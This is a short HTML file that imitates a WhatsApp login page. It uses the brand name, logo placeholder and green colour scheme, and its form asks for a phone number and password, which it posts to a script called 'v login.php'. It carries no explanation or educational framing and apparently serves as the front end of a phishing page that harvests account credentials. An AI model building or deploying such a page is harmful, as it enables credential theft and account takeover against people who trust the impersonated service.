<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>WhatsApp</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      background-color: #f5f5f5;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background-color: #ffffff;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 350px;
      text-align: center;
      border-radius: 10px;
    }
    .container img {
      width: 180px;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #dbdbdb;
      border-radius: 5px;
      background: #fafafa;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #25d366;
      color: white;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover {
      background-color: #128c7e;
    }
    .or {
      margin: 15px 0;
      color: #999;
      font-size: 14px;
    }
    .forgot {
      color: #075e54;
      font-size: 12px;
      text-decoration: none;
    }
  </style>
</head>
<body>

  <div class="container">
    <img src="th.jpeg" alt="WhatsApp Logo" style="width: 100px; height: 80px;">
    <form method="POST" action="v login.php">
      <input type="text" name="phone" placeholder="Phone number" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
    <div class="or">OR</div>
    <a class="forgot" href="#">Forgot password?</a>
  </div>

</body>
</html>
